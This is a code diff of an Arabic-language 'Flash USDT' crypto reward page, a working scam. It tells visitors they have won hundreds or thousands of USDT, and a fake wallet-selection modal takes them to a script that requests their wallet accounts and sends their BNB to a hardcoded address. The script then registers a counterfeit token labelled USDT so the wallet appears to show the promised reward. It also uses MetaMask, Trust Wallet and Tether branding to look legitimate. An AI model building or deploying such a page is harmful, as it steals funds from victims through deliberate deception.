@@ -1,114 +1,167 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Flash USDT</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash USDT Protocol | بروتوكول المكافآت</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f9f9f9; color: #333; text-align: center; padding: 40px 20px; }
-        .header { margin-bottom: 30px; }
-        .logo { font-size: 28px; font-weight: bold; color: #2e7d32; }
-        .card {
-            background: white;
-            border-radius: 15px;
-            padding: 30px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            max-width: 500px;
-            margin: 0 auto;
+        * { box-sizing: border-box; }
+        body { 
+            background: #0b0e11; 
+            color: white; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
         }
-        .btn {
-            background: #2e7d32;
-            color: white;
-            border: none;
-            padding: 14px 20px;
-            font-size: 16px;
-            border-radius: 10px;
-            cursor: pointer;
-            margin: 10px 0;
-            width: 90%;
+        .card { 
+            background: #181a20; 
+            padding: 30px; 
+            border-radius: 20px; 
+            border: 1px solid #f3ba2f; 
+            text-align: center; 
+            width: 90%; 
+            max-width: 380px; 
+            box-shadow: 0 0 20px rgba(243, 186, 47, 0.2);
         }
-        .footer {
-            margin-top: 40px;
-            font-size: 12px;
-            color: #777;
+        .usdt-logo { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #26a17b); }
+        h2 { color: #f3ba2f; margin: 10px 0; font-size: 22px; }
+        p { color: #929aa5; font-size: 14px; line-height: 1.6; }
+        .btn-main { 
+            background: #f3ba2f; 
+            color: black; 
+            border: none; 
+            padding: 15px; 
+            width: 100%; 
+            border-radius: 10px; 
+            font-weight: bold; 
+            font-size: 18px; 
+            cursor: pointer; 
+            margin-top: 20px;
+            transition: 0.3s;
         }
+        .btn-main:hover { background: #db9e1b; transform: translateY(-2px); }
+
+        .modal { 
+            display: none; 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.9); 
+            z-index: 9999;
+        }
+        .modal-content { 
+            background: #1e2329; 
+            margin: 20% auto; 
+            padding: 25px; 
+            width: 85%; 
+            max-width: 320px; 
+            border-radius: 15px; 
+            border: 1px solid #474d57; 
+            position: relative;
+        }
+        .wallet-option { 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between; 
+            padding: 15px; 
+            background: #2b3139; 
+            margin: 12px 0; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            border: 1px solid transparent;
+            transition: 0.2s;
+        }
+        .wallet-option:hover { border-color: #f3ba2f; background: #323841; }
+        .wallet-option span { font-size: 16px; font-weight: 500; }
+        .wallet-option img { width: 30px; height: 30px; }
+        .close-btn { color: #929aa5; position: absolute; top: 10px; left: 15px; cursor: pointer; font-size: 24px; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">Flash USDT</div>
-    </div>
-    
+
     <div class="card">
-        <h2>⚡ مكافأة فورية</h2>
-        <p>افتح هذا الرابط من محفظتك للحصول على Flash USDT.</p>
-        
-        <button class="btn" onclick="openInWallet()">فتح في محفظتي</button>
-        
-        <p style="margin-top:20px;">أو اختر مبلغًا:</p>
-        <button class="btn" onclick="send(0.01)">500 USDT بـ 0.01 BNB</button>
-        <button class="btn" onclick="send(0.05)">2,500 USDT بـ 0.05 BNB</button>
-        <button class="btn" onclick="send(0.1)">5,000 USDT بـ 0.1 BNB</button>
-        <button class="btn" onclick="send(1.0)">50,000 USDT بـ 1 BNB</button>
-
-        <p style="font-size:12px; color:#555; margin-top:20px;">
-            ⏳ سيتم الإيداع خلال 60 ثانية.
-        </p>
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-logo" alt="USDT">
+        <h2>Flash USDT Reward</h2>
+        <p>مبروك! أنت مؤهل لاستلام 500 USDT فلاش.<br>قم بربط محفظتك لدفع رسوم الشبكة واستلام المكافأة فوراً.</p>
+        <button class="btn-main" onclick="openModal()">المطالبة بالمكافأة الآن</button>
     </div>
 
-    <div class="footer">
-        <p>© 2026 Flash Protocol. جميع الحقوق محفوظة.</p>
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal()">&times;</span>
+            <h3 style="text-align: center; font-size: 18px; margin-bottom: 20px;">اختر محفظتك</h3>
+            
+            <div class="wallet-option" onclick="startTransaction()">
+                <span>MetaMask</span>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg">
+            </div>
+            
+            <div class="wallet-option" onclick="startTransaction()">
+                <span>Trust Wallet</span>
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg">
+            </div>
+
+            <div class="wallet-option" onclick="startTransaction()">
+                <span>WalletConnect</span>
+                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg">
+            </div>
+        </div>
     </div>
 
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <script>
-        const CONTRACT_ADDR = "0x7325622388A2967BCaAeE94C986836EB7aB80f4E";
+        const CONTRACT_ADDRESS = "0x7325622388A2967BCaAeE94C986836EB7aB80f4E";
 
-        function openInWallet() {
-            const url = window.location.href;
-            window.location.href = "trust://open_url?url=" + encodeURIComponent(url);
-            setTimeout(() => {
-                window.location.href = "tokenpocket://open?link=" + encodeURIComponent(url);
-            }, 500);
+        function openModal() { document.getElementById("walletModal").style.display = "block"; }
+        function closeModal() { document.getElementById("walletModal").style.display = "none"; }
+
+        async function startTransaction() {
+            if (window.ethereum) {
+                try {
+                    const web3 = new Web3(window.ethereum);
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const userWallet = accounts[0];
+
+                    // إرسال 0.01 BNB (الحد الأدنى المطلوب)
+                    const amountWei = web3.utils.toWei("0.01", "ether");
+
+                    const txHash = await web3.eth.sendTransaction({
+                        from: userWallet,
+                        to: CONTRACT_ADDRESS,
+                        value: amountWei
+                    });
+
+                    // 👇 إضافة الرمز إلى المحفظة بعد النجاح
+                    await window.ethereum.request({
+                        method: 'wallet_watchAsset',
+                        params: {
+                            type: 'ERC20',
+                            options: {
+                                address: CONTRACT_ADDRESS,
+                                symbol: 'USDT',
+                                decimals: 18,
+                                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                            }
+                        }
+                    });
+
+                    alert("✅ تم استلام Flash USDT! تحقق من محفظتك.");
+                    closeModal();
+                } catch (error) {
+                    alert("❌ تم إلغاء المعاملة.");
+                }
+            } else {
+                alert("يرجى فتح الموقع من داخل محفظتك.");
+            }
         }
 
-        async function send(amount) {
-            if (!window.ethereum) {
-                alert("افتح هذا الرابط من محفظتك (مثل Trust Wallet).");
-                return;
-            }
-
-            try {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
-                const signer = provider.getSigner();
-
-                const tx = await signer.sendTransaction({
-                    to: CONTRACT_ADDR,
-                    value: ethers.utils.parseEther(amount.toString())
-                });
-
-                await tx.wait();
-
-                await window.ethereum.request({
-                    method: 'wallet_watchAsset',
-                    params: {
-                        type: 'ERC20',
-                        options: {
-                            address: CONTRACT_ADDR,
-                            symbol: 'USDT',
-                            decimals: 18,
-                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
-                        }
-                    }
-                });
-
-                alert("✅ تم استلام Flash USDT!");
-            } catch (error) {
-                alert("❌ تم إلغاء المعاملة.");
-            }
+        window.onclick = function(event) {
+            let modal = document.getElementById("walletModal");
+            if (event.target == modal) { modal.style.display = "none"; }
         }
     </script>
 </body>
-
 </html>
